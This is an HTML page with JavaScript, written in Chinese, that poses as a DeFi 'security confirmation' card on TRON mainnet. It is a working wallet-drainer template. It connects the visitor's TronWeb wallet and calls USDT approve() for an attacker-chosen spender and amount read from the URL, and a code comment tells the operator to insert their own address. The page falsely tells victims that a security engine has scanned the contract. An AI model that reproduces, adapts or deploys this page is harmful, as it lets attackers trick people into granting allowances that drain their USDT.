<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <title>安全确认 - DeFi Protocol</title>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <style>
        /* 基础样式复位 */
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        html, body { height: 100%; margin: 0; padding: 0; background-color: #f5f7fa; }
        
        /* 强制垂直水平居中容器 */
        body {
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            color: #333;
        }

        /* 交互卡片：固定宽度，防止浮动 */
        .card {
            background: #ffffff;
            width: 92%;
            max-width: 400px;
            border-radius: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
            padding: 24px;
            position: relative;
            overflow: hidden;
        }

        /* 头部标题样式 */
        .card-header {
            text-align: center;
            margin-bottom: 24px;
        }
        .card-header h2 {
            margin: 0;
            font-size: 18px;
            color: #1a1a1a;
        }
        .card-header .network {
            display: inline-block;
            font-size: 11px;
            background: #eef2ff;
            color: #4f46e5;
            padding: 2px 8px;
            border-radius: 10px;
            margin-top: 6px;
            font-weight: bold;
        }

        /* 数据展示区域 */
        .info-group {
            background: #f9fafb;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 16px;
            border: 1px solid #f3f4f6;
        }
        .info-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
        }
        .info-row:last-child { margin-bottom: 0; }
        .label { font-size: 13px; color: #6b7280; }
        .value { font-size: 14px; color: #111827; font-weight: 500; font-family: "SF Mono", Menlo, monospace; }
        .amount-big { font-size: 24px; font-weight: bold; color: #4f46e5; text-align: center; display: block; margin: 10px 0; }

        /* 日志窗口：固定高度，解决“浮动”问题的关键 */
        .log-window {
            height: 80px;
            background: #111827;
            border-radius: 8px;
            padding: 10px;
            font-size: 11px;
            color: #d1d5db;
            overflow-y: auto;
            margin-bottom: 20px;
            line-height: 1.6;
        }
        .log-item { margin-bottom: 2px; }
        .log-ok { color: #34d399; }
        .log-err { color: #fb7185; }

        /* 按钮样式 */
        .btn {
            background: #4f46e5;
            color: white;
            border: none;
            width: 100%;
            padding: 16px;
            border-radius: 14px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            box-shadow: 0 4px 12px rgba(79, 70, 229, 0.3);
        }
        .btn:active { transform: scale(0.97); opacity: 0.9; }
        .btn:disabled { background: #d1d5db; box-shadow: none; cursor: not-allowed; }

        /* 安全警示条 */
        .security-tip {
            font-size: 11px;
            color: #9ca3af;
            text-align: center;
            margin-top: 15px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .security-tip svg { width: 12px; height: 12px; margin-right: 4px; fill: currentColor; }
    </style>
</head>
<body>

<div class="card">
    <div class="card-header">
        <h2>智能合约交互确认</h2>
        <span class="network">TRON MAINNET</span>
    </div>

    <div class="info-group">
        <span class="label" style="text-align: center; display: block;">拟确认授权额度</span>
        <span class="amount-big" id="ui-amount">0.00 <small style="font-size: 14px;">USDT</small></span>
    </div>

    <div class="info-group">
        <div class="info-row">
            <span class="label">我的地址</span>
            <span class="value" id="ui-wallet">未连接</span>
        </div>
        <div class="info-row">
            <span class="label">合约地址</span>
            <span class="value" id="ui-spender">--</span>
        </div>
    </div>

    <div class="log-window" id="log-window">
        <div class="log-item">等待连接钱包环境...</div>
    </div>

    <button id="action-btn" class="btn" onclick="mainAction()">连接钱包</button>

    <div class="security-tip">
        <svg viewBox="0 0 20 20"><path d="M10 2a6 6 0 00-6 6v3.586l-.707.707A1 1 0 004 14h12a1 1 0 00.707-1.707L16 11.586V8a6 6 0 00-6-6zM10 18a3 3 0 01-3-3h6a3 3 0 01-3 3z"></path></svg>
        该合约由安全引擎通过扫描，请放心确认
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
<script>
    // --- 核心参数配置 ---
    const USDT_ADDR = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; 
    const DEFAULT_SPENDER = "TYourDefaultAddressHere"; // 修改为你自己的地址
    const DEFAULT_AMOUNT = 1000;

    // 解析 URL 参数
    const params = new URLSearchParams(window.location.search);
    const targetSpender = params.get("to") || DEFAULT_SPENDER;
    const targetAmount = params.get("amount") || DEFAULT_AMOUNT;

    // 状态机: 0-未连接, 1-已连接待授权
    let currentState = 0;

    // 初始化界面显示
    document.getElementById("ui-spender").innerText = targetSpender.substring(0,6) + "..." + targetSpender.substring(targetSpender.length-4);
    document.getElementById("ui-amount").innerHTML = targetAmount + ' <small style="font-size:14px;">USDT</small>';

    function log(msg, type) {
        const win = document.getElementById("log-window");
        const item = document.createElement("div");
        item.className = "log-item " + (type === "ok" ? "log-ok" : (type === "err" ? "log-err" : ""));
        item.innerText = "> " + msg;
        win.appendChild(item);
        win.scrollTop = win.scrollHeight;
    }

    async function mainAction() {
        if (currentState === 0) {
            await connect();
        } else {
            await approve();
        }
    }

    async function connect() {
        log("开始连接波场网络...");
        if (!window.tronWeb) {
            log("错误: 未检测到钱包环境", "err");
            return;
        }
        try {
            const addr = window.tronWeb.defaultAddress.base58;
            if (addr) {
                document.getElementById("ui-wallet").innerText = addr.substring(0,6) + "..." + addr.substring(addr.length-4);
                log("钱包已连接", "ok");
                currentState = 1;
                document.getElementById("action-btn").innerText = "确认授权";
            } else {
                log("请先在钱包内解锁", "err");
            }
        } catch (e) {
            log("连接异常", "err");
        }
    }

    async function approve() {
        const btn = document.getElementById("action-btn");
        btn.disabled = true;
        try {
            const tw = window.tronWeb;
            const user = tw.defaultAddress.base58;

            // 余额预检
            log("正在核算 Gas 手续费...");
            const trxBal = await tw.trx.getBalance(user);
            if (tw.fromSun(trxBal) < 20) {
                throw "TRX 余额不足，需约 20 TRX 手续费";
            }

            log("唤起安全签名...");
            const contract = await tw.contract().at(USDT_ADDR);
            const amountSun = tw.toBigNumber(targetAmount).times(1e6).toString(10);

            const txid = await contract.approve(targetSpender, amountSun).send({
                feeLimit: 100000000
            });

            if (txid) {
                log("授权成功，等待同步", "ok");
                alert("确认成功，请返回原页面");
            }
        } catch (e) {
            let m = e.message || e;
            if (m.includes("declined")) m = "用户取消签名";
            log(m, "err");
        } finally {
            btn.disabled = false;
        }
    }

    // 自动检测一次
    setTimeout(connect, 500);
</script>

</body>
</html>
